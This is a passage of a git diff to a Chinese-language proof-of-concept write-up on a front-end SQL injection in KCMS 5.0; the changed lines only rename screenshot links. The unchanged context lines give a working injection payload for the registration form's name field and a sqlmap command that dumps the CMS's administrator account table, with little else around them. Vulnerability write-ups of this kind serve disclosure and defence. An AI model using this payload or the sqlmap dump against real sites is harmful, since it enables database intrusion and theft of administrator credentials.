@@ -37,14 +37,14 @@ POC：
     
     name=test' AND 1=1 AND 'inject'='inject&email=sss%40qq.com&password=ssssss&submit=
 
-![](KCMS5.0前台sql注入/20190223150855-e20a10fc-3739-1.jpeg)
+![1](KCMS5.0前台sql注入/20190223150855-e20a10fc-3739-1.jpg)
 
 将POC中的数据包保存下来丢给sqlmap跑即可。
 
 获取管理员账号：
     
     sqlmap -r inject.txt -D mkcms -T mkcms_manager --dump
-![](KCMS5.0前台sql注入/20190223150915-edf05c14-3739-1.jpeg)
+![2](KCMS5.0前台sql注入/20190223150915-edf05c14-3739-1.jpg)
 
 ### 参考链接 ###
 https://xz.aliyun.com/t/4189
